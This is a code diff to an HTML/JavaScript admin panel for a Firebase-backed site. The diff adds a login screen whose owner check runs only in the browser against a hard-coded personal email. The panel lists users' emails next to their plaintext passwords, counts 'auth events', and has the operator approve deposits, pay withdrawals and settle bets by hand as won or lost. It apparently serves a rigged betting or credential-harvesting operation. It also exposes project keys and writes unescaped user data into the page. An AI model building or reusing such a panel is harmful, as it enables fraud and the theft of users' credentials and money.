@@ -10,11 +10,23 @@
         :root { --neon-blue: #00f2ff; --neon-pink: #ff007a; --neon-purple: #7000ff; --neon-green: #38ef7d; --bg-dark: #020205; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
         body { background: var(--bg-dark); color: white; padding: 20px; background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), radial-gradient(at 100% 0%, hsla(225,39%,30%,1) 0, transparent 50%); min-height: 100vh; }
+        
+        /* LOGIN SCREEN STYLES */
+        #auth-gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 10000; display: flex; justify-content: center; align-items: center; }
+        .login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 30px; border: 1px solid var(--neon-blue); text-align: center; box-shadow: 0 0 30px rgba(0,242,255,0.2); width: 90%; max-width: 400px; }
+        .login-box h2 { color: var(--neon-blue); margin-bottom: 20px; letter-spacing: 3px; font-weight: 900; }
+        .login-box input { width: 100%; padding: 15px; margin: 10px 0; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; outline: none; }
+        .login-box button { width: 100%; padding: 15px; background: var(--neon-blue); border: none; border-radius: 12px; color: #000; font-weight: 900; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .login-box button:hover { box-shadow: 0 0 20px var(--neon-blue); }
+        
+        /* DASHBOARD (Hidden until login) */
+        #main-content { display: none; }
+
         h1 { text-align: center; font-weight: 900; letter-spacing: 5px; color: var(--neon-blue); margin-bottom: 30px; text-shadow: 0 0 15px rgba(0,242,255,0.4); }
         .stats-hud { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
         .hud-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; text-align: center; }
         .hud-card p { font-size: 28px; font-weight: 900; color: var(--neon-blue); }
-        .table-wrap { background: rgba(255,255,255,0.02); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; }
+        .table-wrap { background: rgba(255,255,255,0.02); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; min-width: 700px; }
         th { padding: 20px; text-align: left; font-size: 11px; color: var(--neon-blue); background: rgba(0,242,255,0.05); text-transform: uppercase; }
         td { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; }
@@ -31,65 +43,118 @@
 </head>
 <body>
 
-<h1>NEXUS COMMAND</h1>
-
-<div class="stats-hud">
-    <div class="hud-card"><h3>Live Signals</h3><p id="logCount">0</p></div>
-    <div class="hud-card"><h3>Auth Events</h3><p id="authCount">0</p></div>
-    <div class="hud-card"><h3>Transactions</h3><p id="betCount">0</p></div>
+<div id="auth-gate">
+    <div class="login-box">
+        <h2>WISHWORK ADMIN</h2>
+        <input type="email" id="adminEmail" placeholder="Command Email">
+        <input type="password" id="adminPass" placeholder="Security Key">
+        <button id="loginBtn">ACCESS COMMAND</button>
+        <p id="error" style="color:var(--neon-pink); font-size: 12px; margin-top: 15px; font-weight:900;"></p>
+    </div>
 </div>
 
-<div class="table-wrap">
-    <table>
-        <thead><tr><th>User ID & Time</th><th>Value/Pass</th><th>Protocol</th><th>Node Control</th></tr></thead>
-        <tbody id="adminBody"></tbody>
-    </table>
+<div id="main-content">
+    <h1>NEXUS COMMAND</h1>
+    <div style="text-align: right; margin-bottom: 10px;">
+        <button onclick="logout()" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:var(--neon-pink); padding: 5px 15px; border-radius:10px; cursor:pointer; font-size:10px;">TERMINATE SESSION</button>
+    </div>
+
+    <div class="stats-hud">
+        <div class="hud-card"><h3>Live Signals</h3><p id="logCount">0</p></div>
+        <div class="hud-card"><h3>Auth Events</h3><p id="authCount">0</p></div>
+        <div class="hud-card"><h3>Transactions</h3><p id="betCount">0</p></div>
+    </div>
+
+    <div class="table-wrap">
+        <table>
+            <thead><tr><th>User ID & Time</th><th>Value/Pass</th><th>Protocol</th><th>Node Control</th></tr></thead>
+            <tbody id="adminBody"></tbody>
+        </table>
+    </div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc, getDoc, setDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-    const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
+    const firebaseConfig = { 
+        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", 
+        authDomain: "home-help-service.firebaseapp.com", 
+        projectId: "home-help-service", 
+        storageBucket: "home-help-service.firebasestorage.app", 
+        messagingSenderId: "160722457510", 
+        appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" 
+    };
+    
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
+    const auth = getAuth(app);
 
-    onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
-        const body = document.getElementById("adminBody");
-        let html = ""; let auths = 0, bets = 0;
-        snap.forEach(d => {
-            const data = d.data();
-            const id = d.id;
-            const type = data.actionType || "LOG";
-            const utr = data.utr ? `<br><small style="color:var(--neon-green); font-weight:900;">UTR: ${data.utr}</small>` : "";
-            const date = data.time ? new Date(data.time.seconds * 1000).toLocaleString() : "Syncing...";
-            if(type.includes("LOG")) auths++; else bets++;
-            let tagClass = `tag-${type.toLowerCase().split(' ')[0]}`;
+    // SECURITY CHECK
+    const myEmail = "akashbhadouriya123456@gmail.com";
 
-            let actions = "";
-            if (data.status === "PENDING" || data.status === "AWAITING UTR ⏳") {
-                if (type === "DEPOSIT") actions = `<button class="btn btn-green" onclick="appDep('${id}','${data.email}','${data.password}')">APPROVE</button>`;
-                else if (type === "WITHDRAW") actions = `<button class="btn btn-red" onclick="appWith('${id}','${data.email}','${data.password}')">PAYOUT</button>`;
-                else actions = `<button class="btn btn-green" onclick="res('${id}','WIN 🏆','${data.email}','${data.password}')">W</button><button class="btn btn-red" onclick="res('${id}','LOST 💀','${data.email}','${data.password}')">L</button>`;
-            } else actions = `<span style="opacity:0.5; font-size:11px;">${data.status}</span>`;
-
-            html += `<tr>
-                <td>
-                    <div style="color:var(--neon-blue); cursor:pointer;" onclick="setB('${data.email}')">${data.email}</div>
-                    <span style="font-size:10px; opacity:0.3;">${date}</span>
-                    ${utr}
-                </td>
-                <td><code style="background:rgba(0,0,0,0.3); padding:4px 8px; border-radius:8px;">${data.password}</code></td>
-                <td><span class="tag ${tagClass}">${type}</span></td>
-                <td>${actions}<button class="btn btn-del" onclick="delLog('${id}')"><i class="fa fa-trash"></i></button></td>
-            </tr>`;
-        });
-        body.innerHTML = html;
-        document.getElementById("logCount").innerText = snap.size;
-        document.getElementById("authCount").innerText = auths;
-        document.getElementById("betCount").innerText = bets;
+    onAuthStateChanged(auth, (user) => {
+        if (user && user.email === myEmail) {
+            document.getElementById("auth-gate").style.display = "none";
+            document.getElementById("main-content").style.display = "block";
+            startDashboard();
+        } else {
+            document.getElementById("auth-gate").style.display = "flex";
+            document.getElementById("main-content").style.display = "none";
+        }
     });
 
+    document.getElementById("loginBtn").onclick = () => {
+        const e = document.getElementById("adminEmail").value;
+        const p = document.getElementById("adminPass").value;
+        signInWithEmailAndPassword(auth, e, p).catch(() => {
+            document.getElementById("error").innerText = "ACCESS REJECTED: INVALID CREDENTIALS";
+        });
+    };
+
+    window.logout = () => signOut(auth);
+
+    // DASHBOARD LOGIC
+    function startDashboard() {
+        onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
+            const body = document.getElementById("adminBody");
+            let html = ""; let auths = 0, bets = 0;
+            snap.forEach(d => {
+                const data = d.data();
+                const id = d.id;
+                const type = data.actionType || "LOG";
+                const utr = data.utr ? `<br><small style="color:var(--neon-green); font-weight:900;">UTR: ${data.utr}</small>` : "";
+                const date = data.time ? new Date(data.time.seconds * 1000).toLocaleString() : "Syncing...";
+                if(type.includes("LOG")) auths++; else bets++;
+                let tagClass = `tag-${type.toLowerCase().split(' ')[0]}`;
+
+                let actions = "";
+                if (data.status === "PENDING" || data.status === "AWAITING UTR ⏳") {
+                    if (type === "DEPOSIT") actions = `<button class="btn btn-green" onclick="appDep('${id}','${data.email}','${data.password}')">APPROVE</button>`;
+                    else if (type === "WITHDRAW") actions = `<button class="btn btn-red" onclick="appWith('${id}','${data.email}','${data.password}')">PAYOUT</button>`;
+                    else actions = `<button class="btn btn-green" onclick="res('${id}','WIN 🏆','${data.email}','${data.password}')">W</button><button class="btn btn-red" onclick="res('${id}','LOST 💀','${data.email}','${data.password}')">L</button>`;
+                } else actions = `<span style="opacity:0.5; font-size:11px;">${data.status}</span>`;
+
+                html += `<tr>
+                    <td>
+                        <div style="color:var(--neon-blue); cursor:pointer;" onclick="setB('${data.email}')">${data.email}</div>
+                        <span style="font-size:10px; opacity:0.3;">${date}</span>
+                        ${utr}
+                    </td>
+                    <td><code style="background:rgba(0,0,0,0.3); padding:4px 8px; border-radius:8px;">${data.password}</code></td>
+                    <td><span class="tag ${tagClass}">${type}</span></td>
+                    <td>${actions}<button class="btn btn-del" onclick="delLog('${id}')"><i class="fa fa-trash"></i></button></td>
+                </tr>`;
+            });
+            body.innerHTML = html;
+            document.getElementById("logCount").innerText = snap.size;
+            document.getElementById("authCount").innerText = auths;
+            document.getElementById("betCount").innerText = bets;
+        });
+    }
+
+    // BUTTON FUNCTIONS
     window.appDep = async (id, e, v) => {
         const amt = parseInt(v.replace(/[^\d]/g, ''));
         const snap = await getDoc(doc(db, "wallets", e));
@@ -103,7 +168,7 @@
         const amt = parseInt(v.replace(/[^\d]/g, ''));
         const snap = await getDoc(doc(db, "wallets", e));
         const cur = snap.exists() ? snap.data().balance : 0;
-        if(amt > cur) return alert("User spent funds before payout!");
+        if(amt > cur) return alert("Insufficient user balance!");
         await setDoc(doc(db, "wallets", e), { balance: cur - amt });
         await updateDoc(doc(db, "users", id), { status: "PAID 💰" });
         alert("Withdrawal Processed!");
@@ -124,7 +189,7 @@
         }
     };
 
-    window.delLog = async (id) => { if(confirm("Terminate?")) await deleteDoc(doc(db, "users", id)); };
+    window.delLog = async (id) => { if(confirm("Terminate Signal?")) await deleteDoc(doc(db, "users", id)); };
 </script>
 </body>
 </html>
